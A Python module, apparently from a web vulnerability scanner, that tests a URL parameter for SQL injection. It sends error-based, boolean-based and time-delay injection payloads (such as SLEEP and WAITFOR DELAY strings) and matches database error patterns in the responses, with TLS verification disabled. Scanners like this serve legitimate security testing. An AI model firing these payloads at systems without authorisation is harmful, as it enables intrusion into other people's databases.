import re
from typing import Optional
import requests

SQLI_ERROR_PATTERNS = [
    r"SQL syntax.*MySQL",
    r"Warning.*mysql_.*",
    r"MySQLSyntaxErrorException",
    r"valid MySQL result",
    r"check the manual that corresponds to your (MySQL|MariaDB) server",
    r"Unknown column '[^']+' in 'field list'",
    r"Microsoft OLE DB.*SQL Server",
    r"Unclosed quotation mark after the character string",
    r"mssql_query\(\)",
    r"SQL Server.*Driver.*SQL",
    r"Driver.*SQL Server",
    r"SQL Server.*[0-9a-fA-F]{8}",
    r"PostgreSQL.*ERROR",
    r"Warning.*\Wpgsql\W",
    r"valid PostgreSQL result",
    r"PG::SyntaxError",
    r"ORA-[0-9]{5}",
    r"Oracle.*Driver",
    r"SQLite/JDBCDriver",
    r"SQLite.Exception",
    r"System.Data.SQLite",
    r"SQLite3::SQLException",
    r"Unclosed quotation mark",
    r"unclosed quotation mark",
    r"Unterminated string literal",
    r"quoted string not properly terminated",
]

BOOLEAN_PAYLOADS = [
    ("' AND '1'='1", "' AND '1'='2"),
    ("' AND 1=1-- ", "' AND 1=2-- "),
    ("\" AND \"1\"=\"1", "\" AND \"1\"=\"2"),
    ("\" AND 1=1-- ", "\" AND 1=2-- "),
    (") AND 1=1-- ", ") AND 1=2-- "),
    ("') AND 1=1-- ", "') AND 1=2-- "),
]

TIME_PAYLOADS = [
    "' OR SLEEP(3)-- ",
    "' WAITFOR DELAY '0:0:3'-- ",
    "'; WAITFOR DELAY '0:0:3'-- ",
    "' OR pg_sleep(3)-- ",
    "') OR pg_sleep(3)-- ",
]

ERROR_PAYLOADS = [
    "'",
    "\"",
    "')",
    "'))",
    "\\'",
    "\"",
    "`",
    "' OR '1'='1",
    "' OR 1=1-- ",
    "'; SELECT 1-- ",
]


def check(url: str, param: str, sess: Optional[requests.Session] = None,
          timeout: float = 10.0, post_body: bool = False, post_data: dict = None) -> dict:
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "type": None, "evidence": [], "vector": None}

    if post_body and post_data:
        base_data = post_data.copy()
    else:
        base_data = None

    for payload in ERROR_PAYLOADS:
        try:
            if post_data:
                d = base_data.copy() if base_data else {}
                d[param] = payload
                r = sess.post(url, data=d, timeout=timeout, verify=False)
            else:
                sep = "&" if "?" in url else "?"
                r = sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout, verify=False)
            for p in SQLI_ERROR_PATTERNS:
                if re.search(p, r.text, re.IGNORECASE):
                    result["vulnerable"] = True
                    result["type"] = "error"
                    result["evidence"].append(payload[:40])
                    result["vector"] = payload
                    break
        except:
            pass
        if result["vulnerable"]:
            break

    if not result["vulnerable"]:
        for true_p, false_p in BOOLEAN_PAYLOADS:
            try:
                if post_data:
                    d = base_data.copy() if base_data else {}
                    d[param] = true_p
                    r_true = sess.post(url, data=d, timeout=timeout, verify=False)
                    d[param] = false_p
                    r_false = sess.post(url, data=d, timeout=timeout, verify=False)
                else:
                    sep = "&" if "?" in url else "?"
                    r_true = sess.get("%s%s%s=%s" % (url, sep, param, true_p),
                                      timeout=timeout, verify=False)
                    r_false = sess.get("%s%s%s=%s" % (url, sep, param, false_p),
                                       timeout=timeout, verify=False)
                diff = abs(len(r_true.text) - len(r_false.text))
                if diff > 20 or r_true.status_code != r_false.status_code:
                    result["vulnerable"] = True
                    result["type"] = "boolean"
                    result["evidence"].append("bool: %s" % true_p[:30])
                    result["vector"] = true_p
                    break
            except:
                pass
        if result["vulnerable"]:
            return result

    if not result["vulnerable"]:
        for payload in TIME_PAYLOADS:
            try:
                if post_data:
                    d = base_data.copy() if base_data else {}
                    d[param] = payload
                    start = __import__("time").time()
                    sess.post(url, data=d, timeout=timeout + 2, verify=False)
                    elapsed = __import__("time").time() - start
                else:
                    sep = "&" if "?" in url else "?"
                    start = __import__("time").time()
                    sess.get("%s%s%s=%s" % (url, sep, param, payload),
                             timeout=timeout + 2, verify=False)
                    elapsed = __import__("time").time() - start
                if elapsed >= 2.5:
                    result["vulnerable"] = True
                    result["type"] = "time"
                    result["evidence"].append("time: %.1fs" % elapsed)
                    result["vector"] = payload
                    break
            except:
                pass

    return result
